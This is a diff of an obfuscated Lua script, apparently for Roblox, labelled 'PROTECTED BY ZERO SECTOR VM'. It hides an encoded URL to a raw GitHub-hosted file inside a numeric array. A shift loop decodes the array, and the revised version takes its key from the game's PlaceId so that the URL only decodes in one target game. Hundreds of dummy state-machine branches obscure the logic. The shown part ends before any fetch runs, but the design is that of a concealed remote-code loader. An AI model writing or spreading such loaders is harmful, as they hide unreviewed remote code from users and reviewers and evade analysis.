@@ -1,1963 +1,1666 @@
---[[ PROTECTED BY ZERO SECTOR VM v9.5 ]]
-local _G = {game, string, pcall, math, table, getfenv}
-local _D = {122, 134, 134, 130, 133, 76, 65, 65, 132, 115, 137, 64, 121, 123, 134, 122, 135, 116, 135, 133, 119, 132, 117, 129, 128, 134, 119, 128, 134, 64, 117, 129, 127, 65, 137, 134, 120, 72, 73, 66, 67, 69, 74, 71, 63, 133, 134, 115, 117, 125, 65, 63, 65, 132, 119, 120, 133, 65, 122, 119, 115, 118, 133, 65, 127, 115, 123, 128, 65, 96, 87, 93, 97}
-local _K = 18; local _U = ''; local _R = nil;
-local _S = 250
-while _S ~= 0 do
-    if _S == 1 then
-        local _dummy = _G[4].sqrt(1); _S = 296
+--[[ PROTECTED BY ZERO SECTOR VM v9.8.5 ]]
+local _v = {game, string, pcall, math, table, getfenv}
+local _d = {173, 185, 185, 181, 184, 127, 116, 116, 183, 166, 188, 115, 172, 174, 185, 173, 186, 167, 186, 184, 170, 183, 168, 180, 179, 185, 170, 179, 185, 115, 168, 180, 178, 116, 188, 185, 171, 123, 124, 117, 118, 120, 125, 122, 114, 184, 185, 166, 168, 176, 116, 114, 116, 183, 170, 171, 184, 116, 173, 170, 166, 169, 184, 116, 178, 166, 174, 179, 116, 147, 138, 144, 148}
+local _o = 14; local _u = ''; local _r = nil;
+local _s = 100 -- 初始狀態
+
+while _s ~= 0 do
+    if _s == 1 then
+        local _temp = _v[4].sqrt(1); _s = 526
     end
-    if _S == 2 then
-        local _dummy = _G[4].sqrt(2); _S = 392
+    if _s == 2 then
+        local _temp = _v[4].sqrt(2); _s = 450
     end
-    if _S == 3 then
-        local _dummy = _G[4].sqrt(3); _S = 276
+    if _s == 3 then
+        local _temp = _v[4].sqrt(3); _s = 514
     end
-    if _S == 4 then
-        local _dummy = _G[4].sqrt(4); _S = 417
+    if _s == 4 then
+        local _temp = _v[4].sqrt(4); _s = 56
     end
-    if _S == 5 then
-        local _dummy = _G[4].sqrt(5); _S = 473
+    if _s == 5 then
+        local _temp = _v[4].sqrt(5); _s = 90
     end
-    if _S == 6 then
-        local _dummy = _G[4].sqrt(6); _S = 72
+    if _s == 6 then
+        local _temp = _v[4].sqrt(6); _s = 347
     end
-    if _S == 7 then
-        local _dummy = _G[4].sqrt(7); _S = 323
+    if _s == 7 then
+        local _temp = _v[4].sqrt(7); _s = 217
     end
-    if _S == 8 then
-        local _dummy = _G[4].sqrt(8); _S = 462
+    if _s == 8 then
+        local _temp = _v[4].sqrt(8); _s = 332
     end
-    if _S == 9 then
-        local _dummy = _G[4].sqrt(9); _S = 247
+    if _s == 9 then
+        local _temp = _v[4].sqrt(9); _s = 226
     end
-    if _S == 10 then
-        local _dummy = _G[4].sqrt(10); _S = 496
+    if _s == 10 then
+        local _temp = _v[4].sqrt(10); _s = 399
     end
-    if _S == 11 then
-        local _dummy = _G[4].sqrt(11); _S = 378
+    if _s == 11 then
+        local _temp = _v[4].sqrt(11); _s = 275
     end
-    if _S == 12 then
-        local _dummy = _G[4].sqrt(12); _S = 20
+    if _s == 12 then
+        local _temp = _v[4].sqrt(12); _s = 274
     end
-    if _S == 13 then
-        local _dummy = _G[4].sqrt(13); _S = 570
+    if _s == 13 then
+        local _temp = _v[4].sqrt(13); _s = 286
     end
-    if _S == 14 then
-        local _dummy = _G[4].sqrt(14); _S = 494
+    if _s == 14 then
+        local _temp = _v[4].sqrt(14); _s = 51
     end
-    if _S == 15 then
-        local _dummy = _G[4].sqrt(15); _S = 105
+    if _s == 15 then
+        local _temp = _v[4].sqrt(15); _s = 72
     end
-    if (_S + 18 == 34) then
-        local _dummy = _G[4].sqrt(16); _S = 608
+    if _s == 16 then
+        local _temp = _v[4].sqrt(16); _s = 36
     end
-    if _S == 17 then
-        local _dummy = _G[4].sqrt(17); _S = 176
+    if _s == 17 then
+        local _temp = _v[4].sqrt(17); _s = 483
     end
-    if _S == 18 then
-        local _dummy = _G[4].sqrt(18); _S = 176
+    if _s == 18 then
+        local _temp = _v[4].sqrt(18); _s = 351
     end
-    if _S == 19 then
-        local _dummy = _G[4].sqrt(19); _S = 18
+    if _s == 19 then
+        local _temp = _v[4].sqrt(19); _s = 329
     end
-    if _S == 20 then
-        local _dummy = _G[4].sqrt(20); _S = 605
+    if _s == 20 then
+        local _temp = _v[4].sqrt(20); _s = 329
     end
-    if _S == 21 then
-        local _dummy = _G[4].sqrt(21); _S = 258
+    if _s == 21 then
+        local _temp = _v[4].sqrt(21); _s = 210
     end
-    if _S == 22 then
-        local _dummy = _G[4].sqrt(22); _S = 71
+    if _s == 22 then
+        local _temp = _v[4].sqrt(22); _s = 293
     end
-    if _S == 23 then
-        local _dummy = _G[4].sqrt(23); _S = 381
+    if _s == 23 then
+        local _temp = _v[4].sqrt(23); _s = 103
     end
-    if _S == 24 then
-        local _dummy = _G[4].sqrt(24); _S = 440
+    if _s == 24 then
+        local _temp = _v[4].sqrt(24); _s = 303
     end
-    if _S == 25 then
-        local _dummy = _G[4].sqrt(25); _S = 421
+    if _s == 25 then
+        local _temp = _v[4].sqrt(25); _s = 3
     end
-    if _S == 26 then
-        local _dummy = _G[4].sqrt(26); _S = 381
+    if _s == 26 then
+        local _temp = _v[4].sqrt(26); _s = 44
     end
-    if _S == 27 then
-        local _dummy = _G[4].sqrt(27); _S = 414
+    if _s == 27 then
+        local _temp = _v[4].sqrt(27); _s = 270
     end
-    if _S == 28 then
-        local _dummy = _G[4].sqrt(28); _S = 519
+    if _s == 28 then
+        local _temp = _v[4].sqrt(28); _s = 58
     end
-    if _S == 29 then
-        local _dummy = _G[4].sqrt(29); _S = 398
+    if _s == 29 then
+        local _temp = _v[4].sqrt(29); _s = 307
     end
-    if _S == 30 then
-        local _dummy = _G[4].sqrt(30); _S = 621
+    if _s == 30 then
+        local _temp = _v[4].sqrt(30); _s = 378
     end
-    if _S == 31 then
-        local _dummy = _G[4].sqrt(31); _S = 326
+    if _s == 31 then
+        local _temp = _v[4].sqrt(31); _s = 200
     end
-    if (_S + 18 == 50) then
-        local _dummy = _G[4].sqrt(32); _S = 437
+    if _s == 32 then
+        local _temp = _v[4].sqrt(32); _s = 483
     end
-    if _S == 33 then
-        local _dummy = _G[4].sqrt(33); _S = 496
+    if _s == 33 then
+        local _temp = _v[4].sqrt(33); _s = 304
     end
-    if _S == 34 then
-        local _dummy = _G[4].sqrt(34); _S = 309
+    if _s == 34 then
+        local _temp = _v[4].sqrt(34); _s = 191
     end
-    if _S == 35 then
-        local _dummy = _G[4].sqrt(35); _S = 3
+    if _s == 35 then
+        local _temp = _v[4].sqrt(35); _s = 415
     end
-    if _S == 36 then
-        local _dummy = _G[4].sqrt(36); _S = 269
+    if _s == 36 then
+        local _temp = _v[4].sqrt(36); _s = 337
     end
-    if _S == 37 then
-        local _dummy = _G[4].sqrt(37); _S = 3
+    if _s == 37 then
+        local _temp = _v[4].sqrt(37); _s = 308
     end
-    if (_S + 18 == 56) then
-        local _dummy = _G[4].sqrt(38); _S = 282
+    if _s == 38 then
+        local _temp = _v[4].sqrt(38); _s = 425
     end
-    if _S == 39 then
-        local _dummy = _G[4].sqrt(39); _S = 534
+    if _s == 39 then
+        local _temp = _v[4].sqrt(39); _s = 427
     end
-    if _S == 40 then
-        local _dummy = _G[4].sqrt(40); _S = 575
+    if _s == 40 then
+        local _temp = _v[4].sqrt(40); _s = 490
     end
-    if _S == 41 then
-        local _dummy = _G[4].sqrt(41); _S = 307
+    if _s == 41 then
+        local _temp = _v[4].sqrt(41); _s = 197
     end
-    if (_S + 18 == 60) then
-        local _dummy = _G[4].sqrt(42); _S = 90
+    if _s == 42 then
+        local _temp = _v[4].sqrt(42); _s = 63
     end
-    if _S == 43 then
-        local _dummy = _G[4].sqrt(43); _S = 118
+    if _s == 43 then
+        local _temp = _v[4].sqrt(43); _s = 327
     end
-    if _S == 44 then
-        local _dummy = _G[4].sqrt(44); _S = 592
+    if _s == 44 then
+        local _temp = _v[4].sqrt(44); _s = 382
     end
-    if (_S + 18 == 63) then
-        local _dummy = _G[4].sqrt(45); _S = 623
+    if _s == 45 then
+        local _temp = _v[4].sqrt(45); _s = 74
     end
-    if _S == 46 then
-        local _dummy = _G[4].sqrt(46); _S = 59
+    if _s == 46 then
+        local _temp = _v[4].sqrt(46); _s = 184
     end
-    if _S == 47 then
-        local _dummy = _G[4].sqrt(47); _S = 138
+    if _s == 47 then
+        local _temp = _v[4].sqrt(47); _s = 15
     end
-    if _S == 48 then
-        local _dummy = _G[4].sqrt(48); _S = 375
+    if _s == 48 then
+        local _temp = _v[4].sqrt(48); _s = 449
     end
-    if _S == 49 then
-        local _dummy = _G[4].sqrt(49); _S = 491
+    if _s == 49 then
+        local _temp = _v[4].sqrt(49); _s = 392
     end
-    if (_S + 18 == 68) then
-        local _dummy = _G[4].sqrt(50); _S = 397
+    if _s == 50 then
+        local _temp = _v[4].sqrt(50); _s = 355
     end
-    if _S == 51 then
-        local _dummy = _G[4].sqrt(51); _S = 528
+    if _s == 51 then
+        local _temp = _v[4].sqrt(51); _s = 433
     end
-    if (_S + 18 == 70) then
-        local _dummy = _G[4].sqrt(52); _S = 310
+    if _s == 52 then
+        local _temp = _v[4].sqrt(52); _s = 403
     end
-    if _S == 53 then
-        local _dummy = _G[4].sqrt(53); _S = 61
+    if _s == 53 then
+        local _temp = _v[4].sqrt(53); _s = 137
     end
-    if _S == 54 then
-        local _dummy = _G[4].sqrt(54); _S = 125
+    if _s == 54 then
+        local _temp = _v[4].sqrt(54); _s = 205
     end
-    if _S == 55 then
-        local _dummy = _G[4].sqrt(55); _S = 428
+    if _s == 55 then
+        local _temp = _v[4].sqrt(55); _s = 95
     end
-    if _S == 56 then
-        local _dummy = _G[4].sqrt(56); _S = 246
+    if _s == 56 then
+        local _temp = _v[4].sqrt(56); _s = 166
     end
-    if _S == 57 then
-        local _dummy = _G[4].sqrt(57); _S = 490
+    if _s == 57 then
+        local _temp = _v[4].sqrt(57); _s = 448
     end
-    if (_S + 18 == 76) then
-        local _dummy = _G[4].sqrt(58); _S = 342
+    if _s == 58 then
+        local _temp = _v[4].sqrt(58); _s = 513
     end
-    if _S == 59 then
-        local _dummy = _G[4].sqrt(59); _S = 474
+    if _s == 59 then
+        local _temp = _v[4].sqrt(59); _s = 115
     end
-    if _S == 60 then
-        local _dummy = _G[4].sqrt(60); _S = 295
+    if _s == 60 then
+        local _temp = _v[4].sqrt(60); _s = 417
     end
-    if _S == 61 then
-        local _dummy = _G[4].sqrt(61); _S = 164
+    if _s == 61 then
+        local _temp = _v[4].sqrt(61); _s = 273
     end
-    if _S == 62 then
-        local _dummy = _G[4].sqrt(62); _S = 338
+    if _s == 62 then
+        local _temp = _v[4].sqrt(62); _s = 356
     end
-    if (_S + 18 == 81) then
-        local _dummy = _G[4].sqrt(63); _S = 354
+    if _s == 63 then
+        local _temp = _v[4].sqrt(63); _s = 167
     end
-    if _S == 64 then
-        local _dummy = _G[4].sqrt(64); _S = 223
+    if _s == 64 then
+        local _temp = _v[4].sqrt(64); _s = 147
     end
-    if _S == 65 then
-        local _dummy = _G[4].sqrt(65); _S = 187
+    if _s == 65 then
+        local _temp = _v[4].sqrt(65); _s = 262
     end
-    if _S == 66 then
-        local _dummy = _G[4].sqrt(66); _S = 434
+    if _s == 66 then
+        local _temp = _v[4].sqrt(66); _s = 133
     end
-    if _S == 67 then
-        local _dummy = _G[4].sqrt(67); _S = 381
+    if _s == 67 then
+        local _temp = _v[4].sqrt(67); _s = 95
     end
-    if (_S + 18 == 86) then
-        local _dummy = _G[4].sqrt(68); _S = 470
+    if _s == 68 then
+        local _temp = _v[4].sqrt(68); _s = 292
     end
-    if _S == 69 then
-        local _dummy = _G[4].sqrt(69); _S = 413
+    if _s == 69 then
+        local _temp = _v[4].sqrt(69); _s = 415
     end
-    if _S == 70 then
-        local _dummy = _G[4].sqrt(70); _S = 38
+    if _s == 70 then
+        local _temp = _v[4].sqrt(70); _s = 295
     end
-    if _S == 71 then
-        local _dummy = _G[4].sqrt(71); _S = 429
+    if _s == 71 then
+        local _temp = _v[4].sqrt(71); _s = 113
     end
-    if _S == 72 then
-        local _dummy = _G[4].sqrt(72); _S = 225
+    if _s == 72 then
+        local _temp = _v[4].sqrt(72); _s = 3
     end
-    if _S == 73 then
-        local _dummy = _G[4].sqrt(73); _S = 179
+    if _s == 73 then
+        local _temp = _v[4].sqrt(73); _s = 450
     end
-    if _S == 74 then
-        local _dummy = _G[4].sqrt(74); _S = 514
+    if _s == 74 then
+        local _temp = _v[4].sqrt(74); _s = 208
     end
-    if _S == 75 then
-        local _dummy = _G[4].sqrt(75); _S = 573
+    if _s == 75 then
+        local _temp = _v[4].sqrt(75); _s = 148
     end
-    if _S == 76 then
-        local _dummy = _G[4].sqrt(76); _S = 45
+    if _s == 76 then
+        local _temp = _v[4].sqrt(76); _s = 266
     end
-    if _S == 77 then
-        local _dummy = _G[4].sqrt(77); _S = 470
+    if _s == 77 then
+        local _temp = _v[4].sqrt(77); _s = 363
     end
-    if _S == 78 then
-        local _dummy = _G[4].sqrt(78); _S = 229
+    if _s == 78 then
+        local _temp = _v[4].sqrt(78); _s = 483
     end
-    if _S == 79 then
-        local _dummy = _G[4].sqrt(79); _S = 264
+    if _s == 79 then
+        local _temp = _v[4].sqrt(79); _s = 346
     end
-    if _S == 80 then
-        local _dummy = _G[4].sqrt(80); _S = 67
+    if _s == 80 then
+        local _temp = _v[4].sqrt(80); _s = 43
     end
-    if _S == 81 then
-        local _dummy = _G[4].sqrt(81); _S = 303
+    if _s == 81 then
+        local _temp = _v[4].sqrt(81); _s = 242
     end
-    if _S == 82 then
-        local _dummy = _G[4].sqrt(82); _S = 104
+    if _s == 82 then
+        local _temp = _v[4].sqrt(82); _s = 368
     end
-    if _S == 83 then
-        local _dummy = _G[4].sqrt(83); _S = 485
+    if _s == 83 then
+        local _temp = _v[4].sqrt(83); _s = 237
     end
-    if _S == 84 then
-        local _dummy = _G[4].sqrt(84); _S = 331
+    if _s == 84 then
+        local _temp = _v[4].sqrt(84); _s = 182
     end
-    if (_S + 18 == 103) then
-        local _dummy = _G[4].sqrt(85); _S = 618
+    if _s == 85 then
+        local _temp = _v[4].sqrt(85); _s = 284
     end
-    if _S == 86 then
-        local _dummy = _G[4].sqrt(86); _S = 159
+    if _s == 86 then
+        local _temp = _v[4].sqrt(86); _s = 490
     end
-    if (_S + 18 == 105) then
-        local _dummy = _G[4].sqrt(87); _S = 459
+    if _s == 87 then
+        local _temp = _v[4].sqrt(87); _s = 353
     end
-    if _S == 88 then
-        local _dummy = _G[4].sqrt(88); _S = 2
+    if _s == 88 then
+        local _temp = _v[4].sqrt(88); _s = 231
     end
-    if _S == 89 then
-        local _dummy = _G[4].sqrt(89); _S = 628
+    if _s == 89 then
+        local _temp = _v[4].sqrt(89); _s = 294
     end
-    if _S == 90 then
-        local _dummy = _G[4].sqrt(90); _S = 134
+    if _s == 90 then
+        local _temp = _v[4].sqrt(90); _s = 228
     end
-    if (_S + 18 == 109) then
-        local _dummy = _G[4].sqrt(91); _S = 211
+    if _s == 91 then
+        local _temp = _v[4].sqrt(91); _s = 28
     end
-    if _S == 92 then
-        local _dummy = _G[4].sqrt(92); _S = 561
+    if _s == 92 then
+        local _temp = _v[4].sqrt(92); _s = 338
     end
-    if _S == 93 then
-        local _dummy = _G[4].sqrt(93); _S = 381
+    if _s == 93 then
+        local _temp = _v[4].sqrt(93); _s = 300
     end
-    if _S == 94 then
-        local _dummy = _G[4].sqrt(94); _S = 354
+    if _s == 94 then
+        local _temp = _v[4].sqrt(94); _s = 423
     end
-    if _S == 95 then
-        local _dummy = _G[4].sqrt(95); _S = 190
+    if _s == 95 then
+        local _temp = _v[4].sqrt(95); _s = 205
     end
-    if _S == 96 then
-        local _dummy = _G[4].sqrt(96); _S = 57
+    if _s == 96 then
+        local _temp = _v[4].sqrt(96); _s = 70
     end
-    if _S == 97 then
-        local _dummy = _G[4].sqrt(97); _S = 374
+    if _s == 97 then
+        local _temp = _v[4].sqrt(97); _s = 2
     end
-    if _S == 98 then
-        local _dummy = _G[4].sqrt(98); _S = 379
+    if _s == 98 then
+        local _temp = _v[4].sqrt(98); _s = 349
     end
-    if _S == 99 then
-        local _dummy = _G[4].sqrt(99); _S = 68
+    if _s == 99 then
+        local _temp = _v[4].sqrt(99); _s = 281
     end
-    if _S == 100 then
-        local _dummy = _G[4].sqrt(100); _S = 391
+    if _s == 100 then
+        _k = (game.PlaceId % 100) + _o
+        _s = 250
     end
-    if _S == 101 then
-        local _dummy = _G[4].sqrt(101); _S = 132
+    if _s == 101 then
+        local _temp = _v[4].sqrt(101); _s = 526
     end
-    if _S == 102 then
-        local _dummy = _G[4].sqrt(102); _S = 237
+    if _s == 102 then
+        local _temp = _v[4].sqrt(102); _s = 473
     end
-    if _S == 103 then
-        local _dummy = _G[4].sqrt(103); _S = 451
+    if _s == 103 then
+        local _temp = _v[4].sqrt(103); _s = 262
     end
-    if _S == 104 then
-        local _dummy = _G[4].sqrt(104); _S = 61
+    if _s == 104 then
+        local _temp = _v[4].sqrt(104); _s = 183
     end
-    if _S == 105 then
-        local _dummy = _G[4].sqrt(105); _S = 203
+    if _s == 105 then
+        local _temp = _v[4].sqrt(105); _s = 72
     end
-    if _S == 106 then
-        local _dummy = _G[4].sqrt(106); _S = 288
+    if _s == 106 then
+        local _temp = _v[4].sqrt(106); _s = 201
     end
-    if _S == 107 then
-        local _dummy = _G[4].sqrt(107); _S = 114
+    if _s == 107 then
+        local _temp = _v[4].sqrt(107); _s = 451
     end
-    if (_S + 18 == 126) then
-        local _dummy = _G[4].sqrt(108); _S = 520
+    if _s == 108 then
+        local _temp = _v[4].sqrt(108); _s = 436
     end
-    if _S == 109 then
-        local _dummy = _G[4].sqrt(109); _S = 219
+    if _s == 109 then
+        local _temp = _v[4].sqrt(109); _s = 278
     end
-    if _S == 110 then
-        local _dummy = _G[4].sqrt(110); _S = 317
+    if _s == 110 then
+        local _temp = _v[4].sqrt(110); _s = 262
     end
-    if _S == 111 then
-        local _dummy = _G[4].sqrt(111); _S = 45
+    if _s == 111 then
+        local _temp = _v[4].sqrt(111); _s = 134
     end
-    if _S == 112 then
-        local _dummy = _G[4].sqrt(112); _S = 371
+    if _s == 112 then
+        local _temp = _v[4].sqrt(112); _s = 137
     end
-    if _S == 113 then
-        local _dummy = _G[4].sqrt(113); _S = 530
+    if _s == 113 then
+        local _temp = _v[4].sqrt(113); _s = 364
     end
-    if _S == 114 then
-        local _dummy = _G[4].sqrt(114); _S = 220
+    if _s == 114 then
+        local _temp = _v[4].sqrt(114); _s = 307
     end
-    if _S == 115 then
-        local _dummy = _G[4].sqrt(115); _S = 510
+    if _s == 115 then
+        local _temp = _v[4].sqrt(115); _s = 439
     end
-    if _S == 116 then
-        local _dummy = _G[4].sqrt(116); _S = 190
+    if _s == 116 then
+        local _temp = _v[4].sqrt(116); _s = 212
     end
-    if (_S + 18 == 135) then
-        local _dummy = _G[4].sqrt(117); _S = 643
+    if _s == 117 then
+        local _temp = _v[4].sqrt(117); _s = 388
     end
-    if _S == 118 then
-        local _dummy = _G[4].sqrt(118); _S = 93
+    if _s == 118 then
+        local _temp = _v[4].sqrt(118); _s = 46
     end
-    if _S == 119 then
-        local _dummy = _G[4].sqrt(119); _S = 326
+    if _s == 119 then
+        local _temp = _v[4].sqrt(119); _s = 334
     end
-    if _S == 120 then
-        for i=1, #_D do _U = _U .. _G[2].char(_D[i] - _K) end
-        _S = 480
+    if _s == 120 then
+        local _temp = _v[4].sqrt(120); _s = 167
     end
-    if _S == 121 then
-        local _dummy = _G[4].sqrt(121); _S = 165
+    if _s == 121 then
+        local _temp = _v[4].sqrt(121); _s = 507
     end
-    if _S == 122 then
-        local _dummy = _G[4].sqrt(122); _S = 540
+    if _s == 122 then
+        local _temp = _v[4].sqrt(122); _s = 66
     end
-    if _S == 123 then
-        local _dummy = _G[4].sqrt(123); _S = 106
+    if _s == 123 then
+        local _temp = _v[4].sqrt(123); _s = 313
     end
-    if _S == 124 then
-        local _dummy = _G[4].sqrt(124); _S = 272
+    if _s == 124 then
+        local _temp = _v[4].sqrt(124); _s = 137
     end
-    if _S == 125 then
-        local _dummy = _G[4].sqrt(125); _S = 329
+    if _s == 125 then
+        local _temp = _v[4].sqrt(125); _s = 11
     end
-    if _S == 126 then
-        local _dummy = _G[4].sqrt(126); _S = 520
+    if _s == 126 then
+        local _temp = _v[4].sqrt(126); _s = 546
     end
-    if (_S + 18 == 145) then
-        local _dummy = _G[4].sqrt(127); _S = 367
+    if _s == 127 then
+        local _temp = _v[4].sqrt(127); _s = 33
     end
-    if _S == 128 then
-        local _dummy = _G[4].sqrt(128); _S = 303
+    if _s == 128 then
+        local _temp = _v[4].sqrt(128); _s = 290
     end
-    if _S == 129 then
-        local _dummy = _G[4].sqrt(129); _S = 579
+    if _s == 129 then
+        local _temp = _v[4].sqrt(129); _s = 210
     end
-    if _S == 130 then
-        local _dummy = _G[4].sqrt(130); _S = 144
+    if _s == 130 then
+        local _temp = _v[4].sqrt(130); _s = 387
     end
-    if _S == 131 then
-        local _dummy = _G[4].sqrt(131); _S = 395
+    if _s == 131 then
+        local _temp = _v[4].sqrt(131); _s = 368
     end
-    if _S == 132 then
-        local _dummy = _G[4].sqrt(132); _S = 296
+    if _s == 132 then
+        local _temp = _v[4].sqrt(132); _s = 165
     end
-    if _S == 133 then
-        local _dummy = _G[4].sqrt(133); _S = 582
+    if _s == 133 then
+        local _temp = _v[4].sqrt(133); _s = 358
     end
-    if _S == 134 then
-        local _dummy = _G[4].sqrt(134); _S = 400
+    if _s == 134 then
+        local _temp = _v[4].sqrt(134); _s = 138
     end
-    if _S == 135 then
-        local _dummy = _G[4].sqrt(135); _S = 508
+    if _s == 135 then
+        local _temp = _v[4].sqrt(135); _s = 265
     end
-    if (_S + 18 == 154) then
-        local _dummy = _G[4].sqrt(136); _S = 447
+    if _s == 136 then
+        local _temp = _v[4].sqrt(136); _s = 12
     end
-    if (_S + 18 == 155) then
-        local _dummy = _G[4].sqrt(137); _S = 527
+    if _s == 137 then
+        local _temp = _v[4].sqrt(137); _s = 530
     end
-    if _S == 138 then
-        local _dummy = _G[4].sqrt(138); _S = 488
+    if _s == 138 then
+        local _temp = _v[4].sqrt(138); _s = 218
     end
-    if _S == 139 then
-        local _dummy = _G[4].sqrt(139); _S = 235
+    if _s == 139 then
+        local _temp = _v[4].sqrt(139); _s = 440
     end
-    if _S == 140 then
-        local _dummy = _G[4].sqrt(140); _S = 251
+    if _s == 140 then
+        local _temp = _v[4].sqrt(140); _s = 397
     end
-    if _S == 141 then
-        local _dummy = _G[4].sqrt(141); _S = 135
+    if _s == 141 then
+        local _temp = _v[4].sqrt(141); _s = 45
     end
-    if _S == 142 then
-        local _dummy = _G[4].sqrt(142); _S = 265
+    if _s == 142 then
+        local _temp = _v[4].sqrt(142); _s = 32
     end
-    if _S == 143 then
-        local _dummy = _G[4].sqrt(143); _S = 487
+    if _s == 143 then
+        local _temp = _v[4].sqrt(143); _s = 313
     end
-    if _S == 144 then
-        local _dummy = _G[4].sqrt(144); _S = 200
+    if _s == 144 then
+        local _temp = _v[4].sqrt(144); _s = 317
     end
-    if _S == 145 then
-        local _dummy = _G[4].sqrt(145); _S = 448
+    if _s == 145 then
+        local _temp = _v[4].sqrt(145); _s = 352
     end
-    if _S == 146 then
-        local _dummy = _G[4].sqrt(146); _S = 549
+    if _s == 146 then
+        local _temp = _v[4].sqrt(146); _s = 272
     end
-    if (_S + 18 == 165) then
-        local _dummy = _G[4].sqrt(147); _S = 589
+    if _s == 147 then
+        local _temp = _v[4].sqrt(147); _s = 457
     end
-    if _S == 148 then
-        local _dummy = _G[4].sqrt(148); _S = 522
+    if _s == 148 then
+        local _temp = _v[4].sqrt(148); _s = 531
     end
-    if _S == 149 then
-        local _dummy = _G[4].sqrt(149); _S = 48
+    if _s == 149 then
+        local _temp = _v[4].sqrt(149); _s = 192
     end
-    if (_S + 18 == 168) then
-        local _dummy = _G[4].sqrt(150); _S = 554
+    if _s == 150 then
+        local _temp = _v[4].sqrt(150); _s = 436
     end
-    if _S == 151 then
-        local _dummy = _G[4].sqrt(151); _S = 339
+    if _s == 151 then
+        local _temp = _v[4].sqrt(151); _s = 288
     end
-    if _S == 152 then
-        local _dummy = _G[4].sqrt(152); _S = 125
+    if _s == 152 then
+        local _temp = _v[4].sqrt(152); _s = 233
     end
-    if (_S + 18 == 171) then
-        local _dummy = _G[4].sqrt(153); _S = 523
+    if _s == 153 then
+        local _temp = _v[4].sqrt(153); _s = 39
     end
-    if _S == 154 then
-        local _dummy = _G[4].sqrt(154); _S = 219
+    if _s == 154 then
+        local _temp = _v[4].sqrt(154); _s = 136
     end
-    if _S == 155 then
-        local _dummy = _G[4].sqrt(155); _S = 59
+    if _s == 155 then
+        local _temp = _v[4].sqrt(155); _s = 440
     end
-    if _S == 156 then
-        local _dummy = _G[4].sqrt(156); _S = 121
+    if _s == 156 then
+        local _temp = _v[4].sqrt(156); _s = 36
     end
-    if _S == 157 then
-        local _dummy = _G[4].sqrt(157); _S = 502
+    if _s == 157 then
+        local _temp = _v[4].sqrt(157); _s = 479
     end
-    if (_S + 18 == 176) then
-        local _dummy = _G[4].sqrt(158); _S = 218
+    if _s == 158 then
+        local _temp = _v[4].sqrt(158); _s = 500
     end
-    if _S == 159 then
-        local _dummy = _G[4].sqrt(159); _S = 609
+    if _s == 159 then
+        local _temp = _v[4].sqrt(159); _s = 474
     end
-    if _S == 160 then
-        local _dummy = _G[4].sqrt(160); _S = 557
+    if _s == 160 then
+        local _temp = _v[4].sqrt(160); _s = 370
     end
-    if (_S + 18 == 179) then
-        local _dummy = _G[4].sqrt(161); _S = 433
+    if _s == 161 then
+        local _temp = _v[4].sqrt(161); _s = 277
     end
-    if _S == 162 then
-        local _dummy = _G[4].sqrt(162); _S = 288
+    if _s == 162 then
+        local _temp = _v[4].sqrt(162); _s = 401
     end
-    if _S == 163 then
-        local _dummy = _G[4].sqrt(163); _S = 188
+    if _s == 163 then
+        local _temp = _v[4].sqrt(163); _s = 436
     end
-    if _S == 164 then
-        local _dummy = _G[4].sqrt(164); _S = 293
+    if _s == 164 then
+        local _temp = _v[4].sqrt(164); _s = 140
     end
-    if _S == 165 then
-        local _dummy = _G[4].sqrt(165); _S = 25
+    if _s == 165 then
+        local _temp = _v[4].sqrt(165); _s = 136
     end
-    if (_S + 18 == 184) then
-        local _dummy = _G[4].sqrt(166); _S = 576
+    if _s == 166 then
+        local _temp = _v[4].sqrt(166); _s = 137
     end
-    if _S == 167 then
-        local _dummy = _G[4].sqrt(167); _S = 499
+    if _s == 167 then
+        local _temp = _v[4].sqrt(167); _s = 180
     end
-    if _S == 168 then
-        local _dummy = _G[4].sqrt(168); _S = 118
+    if _s == 168 then
+        local _temp = _v[4].sqrt(168); _s = 327
     end
-    if (_S + 18 == 187) then
-        local _dummy = _G[4].sqrt(169); _S = 196
+    if _s == 169 then
+        local _temp = _v[4].sqrt(169); _s = 382
     end
-    if _S == 170 then
-        local _dummy = _G[4].sqrt(170); _S = 17
+    if _s == 170 then
+        local _temp = _v[4].sqrt(170); _s = 201
     end
-    if _S == 171 then
-        local _dummy = _G[4].sqrt(171); _S = 481
+    if _s == 171 then
+        local _temp = _v[4].sqrt(171); _s = 91
     end
-    if _S == 172 then
-        local _dummy = _G[4].sqrt(172); _S = 388
+    if _s == 172 then
+        local _temp = _v[4].sqrt(172); _s = 284
     end
-    if _S == 173 then
-        local _dummy = _G[4].sqrt(173); _S = 449
+    if _s == 173 then
+        local _temp = _v[4].sqrt(173); _s = 363
     end
-    if (_S + 18 == 192) then
-        local _dummy = _G[4].sqrt(174); _S = 230
+    if _s == 174 then
+        local _temp = _v[4].sqrt(174); _s = 337
     end
-    if _S == 175 then
-        local _dummy = _G[4].sqrt(175); _S = 327
+    if _s == 175 then
+        local _temp = _v[4].sqrt(175); _s = 294
     end
-    if _S == 176 then
-        local _dummy = _G[4].sqrt(176); _S = 253
+    if _s == 176 then
+        local _temp = _v[4].sqrt(176); _s = 319
     end
-    if _S == 177 then
-        local _dummy = _G[4].sqrt(177); _S = 386
+    if _s == 177 then
+        local _temp = _v[4].sqrt(177); _s = 197
     end
-    if _S == 178 then
-        local _dummy = _G[4].sqrt(178); _S = 184
+    if _s == 178 then
+        local _temp = _v[4].sqrt(178); _s = 225
     end
-    if _S == 179 then
-        local _dummy = _G[4].sqrt(179); _S = 207
+    if _s == 179 then
+        local _temp = _v[4].sqrt(179); _s = 519
     end
-    if _S == 180 then
-        local _dummy = _G[4].sqrt(180); _S = 407
+    if _s == 180 then
+        local _temp = _v[4].sqrt(180); _s = 177
     end
-    if _S == 181 then
-        local _dummy = _G[4].sqrt(181); _S = 84
+    if _s == 181 then
+        local _temp = _v[4].sqrt(181); _s = 341
     end
-    if _S == 182 then
-        local _dummy = _G[4].sqrt(182); _S = 576
+    if _s == 182 then
+        local _temp = _v[4].sqrt(182); _s = 101
     end
-    if (_S + 18 == 201) then
-        local _dummy = _G[4].sqrt(183); _S = 641
+    if _s == 183 then
+        local _temp = _v[4].sqrt(183); _s = 490
     end
-    if _S == 184 then
-        local _dummy = _G[4].sqrt(184); _S = 395
+    if _s == 184 then
+        local _temp = _v[4].sqrt(184); _s = 435
     end
-    if _S == 185 then
-        local _dummy = _G[4].sqrt(185); _S = 556
+    if _s == 185 then
+        local _temp = _v[4].sqrt(185); _s = 359
     end
-    if _S == 186 then
-        local _dummy = _G[4].sqrt(186); _S = 34
+    if _s == 186 then
+        local _temp = _v[4].sqrt(186); _s = 90
     end
-    if _S == 187 then
